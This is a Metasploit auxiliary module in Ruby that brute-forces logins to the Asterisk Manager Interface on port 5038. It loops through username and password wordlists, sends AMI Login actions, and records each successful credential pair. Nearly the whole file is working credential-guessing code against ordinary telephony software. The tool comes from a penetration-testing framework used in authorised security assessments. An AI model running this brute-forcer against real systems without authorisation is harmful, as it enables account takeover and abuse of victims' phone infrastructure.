# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Asterisk Manager Login Utility',
      'Description'    => %q{
        This module attempts to authenticate to an Asterisk Manager service. Please note
        that by default, Asterisk Call Management (port 5038) only listens locally, but
        this can be manually configured in file /etc/asterisk/manager.conf by the admin
        on the victim machine.
      },
      'Author'         =>
        [
          'Alligator Security Team <dflah[at]alligatorteam.org>',
        ],
      'References'     =>
        [
          ['URL', 'http://www.asterisk.org/astdocs/node201.html'], # Docs for AMI
        ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(5038),
        OptString.new('USER_FILE',
          [
            false,
            'The file that contains a list of probable users accounts.',
            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')
          ]),

        OptString.new('PASS_FILE',
          [
            false,
            'The file that contains a list of probable passwords.',
            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
          ])
      ], self.class)
  end

  def run_host(ip)
    print_status("Initializing module...")
    begin
      each_user_pass do |user, pass|
        do_login(user, pass)
      end
    rescue ::Rex::ConnectionError
    rescue ::Exception => e
      vprint_error("#{rhost}:#{rport} #{e.to_s} #{e.backtrace}")
    end
  end

  def send_manager(command='')
    begin
      @result = ''
      if (!@connected)
        connect
        @connected = true
        Rex.sleep(0.4)
      end
      sock.put(command)
      @result = sock.get_once || ''
    rescue ::Exception => err
      print_error("Error: #{err.to_s}")
    end
  end

  def do_login(user='',pass='')
    @connected = false
    begin
      send_manager(nil) # connect Only
      if @result !~ /^Asterisk Call Manager(.*)/
        print_error("Asterisk Manager does not appear to be running")
        return :abort
      else
        vprint_status("#{rhost}:#{rport} - Trying user:'#{user}' with password:'#{pass}'")
        cmd = "Action: Login\r\nUsername: #{user}\r\nSecret: #{pass}\r\n\r\n"
        send_manager(cmd)
        if /Response: Success/.match(@result)
          print_good("User: \"#{user}\" using pass: \"#{pass}\" - can login on #{rhost}:#{rport}!")
          report_auth_info(
            :host   => rhost,
            :port   => rport,
            :sname  => 'asterisk_manager',
            :user   => user,
            :pass   => pass,
            :active => true,
            :update => :unique_data
          )
          disconnect
          return :next_user
        else
          disconnect
          return :fail
        end
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
